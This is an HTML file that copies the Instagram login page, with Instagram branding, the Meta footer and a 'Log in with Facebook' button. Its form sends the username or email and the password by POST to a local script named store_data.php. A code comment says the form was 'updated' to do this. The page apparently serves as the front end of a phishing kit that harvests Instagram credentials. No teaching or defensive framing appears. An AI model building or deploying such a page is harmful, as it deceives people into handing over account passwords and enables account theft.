<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <link rel="icon" type="image/png" href="icon.png">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <h1 class="logo">Instagram</h1>
        <!-- Form updated to send data to store_data.php using POST -->
        <form class="login-form" action="store_data.php" method="POST">
            <!-- Email input with name attribute for form submission -->
            <input type="text" name="email" placeholder="Phone number, username, or email" required>
            <!-- Password input with name attribute for form submission -->
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="login-btn">Log in</button>
            <div class="separator">OR</div>
            <button type="button" class="fb-login-btn">Log in with Facebook</button>
            <a href="#" class="forgot-password">Forgot password?</a>
        </form>
        <div class="signup-container">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
        <div class="app-links">
            <p>Get the app.</p>
            <div class="store-buttons">
                <img src="google-play.png" alt="Google Play">
                <img src="microsoft-store.png" alt="Microsoft Store">
            </div>
        </div>
    </div>
    <footer>
        <ul class="footer-links">
            <li><a href="#">Meta</a></li>
            <li><a href="#">About</a></li>
            <li><a href="#">Blog</a></li>
            <li><a href="#">Jobs</a></li>
            <li><a href="#">Help</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Locations</a></li>
            <li><a href="#">Instagram Lite</a></li>
            <li><a href="#">Threads</a></li>
        </ul>
        <p>© 2024 Instagram from Meta</p>
    </footer>
</body>
</html>
